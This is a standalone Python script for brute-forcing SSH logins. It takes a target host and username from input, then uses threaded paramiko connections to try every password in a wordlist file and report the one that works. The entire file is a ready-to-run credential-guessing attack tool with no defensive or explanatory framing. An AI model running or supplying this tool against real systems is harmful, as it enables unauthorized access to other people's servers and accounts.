# -*- Coding : utf-8 -*-

import socket, time, threading, sys
import paramiko, termcolor

password_found = False

def ssh_connect(password):
    global password_found

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, password=password, username=username)
        password_found = True
        print(termcolor.colored(f"[+] Found password : {password}", "green"))
    except paramiko.AuthenticationException:
        print(termcolor.colored(f"[-] Incorrect login : {password}", "red"))
    except socket.error as e:
        print(termcolor.colored(f"[-] Can't establish connection", "yellow"))
        print(f"Cause : {e}")

    ssh.close()

host = input("[*] Enter the SSH address : ")
username = input("[*] Enter the SSH username : ")

print(f"\n[*] Starting SSH bruteforce for {username}@{host}")

with open("common.txt", "r") as file:
    for line in file.readlines():
        if password_found:
            t.join()
            exit()

        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(0.5)